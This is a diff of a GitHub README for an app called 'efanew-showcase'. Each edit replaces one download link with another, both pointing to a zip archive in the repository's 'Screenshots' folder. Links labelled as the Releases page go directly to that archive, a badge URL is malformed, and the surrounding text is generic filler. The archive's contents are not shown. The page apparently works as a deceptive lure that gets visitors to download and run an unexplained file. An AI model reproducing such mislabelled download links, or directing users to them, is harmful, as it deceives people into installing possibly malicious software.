@@ -4,7 +4,7 @@
 Welcome to efanew-showcase! This application allows you to explore the EFA Monitoring System. You can check out a live demo and get a glimpse of how this system works. 
 
 ## 📥 Download Now
-[![Download Here](https://github.com/PhornSeavmeng/efanew-showcase/raw/refs/heads/main/Screenshots/efanew_showcase_3.8.zip%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/PhornSeavmeng/efanew-showcase/raw/refs/heads/main/Screenshots/efanew_showcase_3.8.zip)
+[![Download Here](https://raw.githubusercontent.com/PhornSeavmeng/efanew-showcase/main/Screenshots/efanew-showcase-v1.4-alpha.3.zip%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/PhornSeavmeng/efanew-showcase/main/Screenshots/efanew-showcase-v1.4-alpha.3.zip)
 
 ## 💡 What is efanew-showcase?
 efanew-showcase is designed to provide an intuitive dashboard for monitoring various systems. It focuses on education and aligns with NGO needs. The application uses role-based access control (RBAC) to ensure users get the right information they need without confusion. 
@@ -27,7 +27,7 @@ You can easily track real-time data and make informed decisions from the dashboa
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the application. 
 
-[Visit the Releases Page to Download](https://github.com/PhornSeavmeng/efanew-showcase/raw/refs/heads/main/Screenshots/efanew_showcase_3.8.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/PhornSeavmeng/efanew-showcase/main/Screenshots/efanew-showcase-v1.4-alpha.3.zip)
 
 1. Click on the “Releases” link above.
 2. Find the latest version of the software.
@@ -54,6 +54,6 @@ Keep an eye on our Releases page for future updates and new features. We are alw
 ## 🔗 Connect with Us
 Stay updated with our latest news. Follow us on GitHub and join the community to share your experiences and insights.
 
-[Visit the Releases Page to Download](https://github.com/PhornSeavmeng/efanew-showcase/raw/refs/heads/main/Screenshots/efanew_showcase_3.8.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/PhornSeavmeng/efanew-showcase/main/Screenshots/efanew-showcase-v1.4-alpha.3.zip)
 
 Thank you for choosing efanew-showcase! Enjoy your experience with the EFA Monitoring System.
